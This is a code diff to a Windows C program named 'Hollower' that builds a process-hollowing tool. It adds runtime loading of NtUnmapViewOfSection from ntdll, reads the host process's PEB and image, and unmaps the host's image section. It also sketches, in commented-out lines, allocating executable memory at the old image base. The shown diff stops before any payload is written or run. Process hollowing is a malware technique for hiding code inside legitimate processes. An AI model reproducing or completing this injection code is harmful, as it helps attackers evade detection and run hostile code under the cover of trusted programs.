@@ -1,11 +1,9 @@
 #include <Windows.h>
+#include <stdio.h>
 
 #include "PEB.h"
 #include "Ntapi.h"
 #include "Hollower.h"
-
-_PPEB ReadRemotePEB(HANDLE);
-PLOADED_IMAGE ReadRemoteImage(HANDLE, LPCVOID);
 
 //
 // Hollower logic
@@ -16,7 +14,23 @@ INT main() {
 	PLOADED_IMAGE			pImage = NULL;
 	_PPEB					pPEB = NULL;
 	BOOL					bRet;
+	NTSTATUS				ntStatus;
 	HANDLE					hHostProcess;
+
+	// Function pointers
+	NTUNMAPVIEWOFSECTION	pNtUnmapViewOfSection;
+
+	//
+	// Load required functions from ntdll
+	//
+	CONST HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
+	if (hNtdll) {
+		pNtUnmapViewOfSection = (NTUNMAPVIEWOFSECTION)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
+		FreeLibrary(hNtdll);
+	}
+	else {
+		return ERROR_OPEN_FAILED;
+	}
 	
 	//
 	// Create host process
@@ -41,8 +55,21 @@ INT main() {
 
 	hHostProcess = processInformation.hProcess;
 	pPEB = ReadRemotePEB(hHostProcess);
-
 	pImage = ReadRemoteImage(hHostProcess, pPEB->lpImageBaseAddress);
+
+	printf("[*] Unmapping section\r\n");
+	ntStatus = pNtUnmapViewOfSection(hHostProcess, pPEB->lpImageBaseAddress);
+	if (!NT_SUCCESS(ntStatus)) {
+		printf("[-] Error unmapping section\r\n");
+		goto lblCleanup;
+	}
+
+	printf("[*] Allocating memory\r\n");
+	//PVOID pRemoteImage = VirtualAllocEx(hHostProcess,
+	//	pPEB->lpImageBaseAddress,
+	//	pSourceHeaders->OptionalHeader.SizeOfImage,
+	//	MEM_COMMIT | MEM_RESERVE,
+	//	PAGE_EXECUTE_READWRITE);
 
 lblCleanup:
 	if (processInformation.hProcess)
@@ -91,10 +118,10 @@ PPROCESS_BASIC_INFORMATION FindRemotePEB(HANDLE hProcess) {
 
 _PPEB ReadRemotePEB(HANDLE hProcess) {
 	PPROCESS_BASIC_INFORMATION	pBasicInfo = FindRemotePEB(hProcess);
-	DWORD						dwPEBAddress = pBasicInfo->PebBaseAddress;
-
 	if (!pBasicInfo)
 		return NULL;
+
+	DWORD dwPEBAddress = pBasicInfo->PebBaseAddress;
 
 	_PPEB pPEB = malloc(sizeof(_PEB));  // todo: Replace with virtualalloc
 	if (!pPEB)
